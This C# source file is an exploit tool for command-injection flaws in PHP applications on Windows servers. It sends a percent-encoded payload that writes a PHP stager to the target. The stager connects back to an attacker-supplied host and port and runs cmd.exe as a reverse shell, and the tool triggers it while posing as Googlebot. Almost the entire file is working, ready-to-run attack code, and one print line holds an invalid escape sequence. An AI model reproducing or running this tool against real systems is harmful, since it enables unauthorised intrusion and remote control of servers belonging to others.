/*
 * Generic PHP Remote Command Injection Exploit
 *      By: Aleksey (github.com/Alekseyyy)
 * 
 * This exploits generic Command Injection [1] 
 * vulnerabilities found within PHP applications
 * to return an interactive, simple, reverse-connect 
 * shell. It deals with vulnerable code that's 
 * along the lines of:
 * 
 * <?php
 *      $arg = $_GET['arg'];
 *      system('command $arg');
 * ?>
 * 
 * NOTE: I'm operating under the assumption that
 * the target server is running some flavour
 * of Microsoft Windows and ergo, this script
 * injects payloads fine-tuned to the Windows
 * environment. I might fix this in the future.
 * 
 * Compilng the exploit: I don't think that you'll
 * need Visual Studio to compile this. Just
 * install the .NET 4.0 framework, add
 * "C:\Windows\Microsoft.NET\Framework\v4.0.x"
 * to Environment Variables and compile away
 * with 'csc exploit.cs'
 * 
 * [1]: OWASP Reference:
 *  https://www.owasp.org/index.php/Command_Injection
 */

using System;
using System.IO;
using System.Net;

class Exploit {

    private const string useragent = "Googlebot/2.1 (+http://www.googlebot.com/bot.html)";

    private static void PrintHelp(){
        Console.WriteLine("=======================================================================");
        Console.WriteLine("= Generic PHP Remote Code Execution Exploit");
        Console.WriteLine("= \Written by Aleksey (github.com/Alekseyyy)");
        Console.WriteLine("= \n= Exploits (windows-based) PHP Remote Code Execution bug to execute");
        Console.WriteLine("= a reverse, simple, interactive connect-back shell.\n= ");
        Console.WriteLine("= Run like: exploit.exe <SCRIPT> <LHOST> <LPORT>");
        Console.WriteLine("= ");
        Console.WriteLine("= \t<SCRIPT> is the vulnerable script (with the parameter)");
        Console.WriteLine("= \t<LHOST> is the IP address (or DNS address) of the machine");
        Console.WriteLine("= \t\trecieving the connect-back shell");
        Console.WriteLine("= \t<LPORT> is the listening port for the connect back shell");
        Console.WriteLine("=======================================================================\n\n");
    }

    public static void Main(string[] args){
        
        if (args.Length != 3) {
            PrintHelp();
            Environment.Exit(-1);
        }

        Console.WriteLine("[*] Building the injection vector...");
        string payload = "%62%6c%61%68%26%65%63%68%6f%20%22%3c%3f%70%68%70%20%24%73%6f%63%6b";
        payload = payload + "%3d%66%73%6f%63%6b%6f%70%65%6e%28%22{0}%22%2c{1}%29%3b%65%78%65";
        payload = payload + "%63%28%22%63%6d%64%2e%65%78%65%22%29%3b%20%3f%3e%22%20%3e%20%73";
        payload = payload + "%74%61%67%65%72%2e%70%68%70";
        string injection = String.Format(payload, args[1], args[2]);

        Console.WriteLine("[*] Sending the exploit...");
        string attack = args[0] + injection;
        WebRequest injectrequest = WebRequest.Create(attack);
        injectrequest.Credentials = CredentialCache.DefaultCredentials;
        ((HttpWebRequest)injectrequest).UserAgent = useragent;
        WebResponse injectresponse = injectrequest.GetResponse();
        if ((((HttpWebResponse)injectresponse).StatusDescription) == "OK") {
            Console.WriteLine("[+] Successful exploitation, you should recieve a shell shortly...");
            Uri parsestageruri = new Uri(args[0]);
            string stager = "http://" + parsestageruri.Authority;
            for (int i = 0; i < parsestageruri.Segments.Length - 1; i++)
                stager = stager + parsestageruri.Segments[i];
            stager = stager + "stager.php";
            WebRequest stagerrequest = WebRequest.Create(stager);
            stagerrequest.Credentials = CredentialCache.DefaultCredentials;
            ((HttpWebRequest)stagerrequest).UserAgent = useragent;
            stagerrequest.GetResponse();
            Environment.Exit(0);
        }
        else {
            Console.WriteLine("[-] Failed to inject 'reverse' shell...");
            Environment.Exit(-1);
        }
    }
}
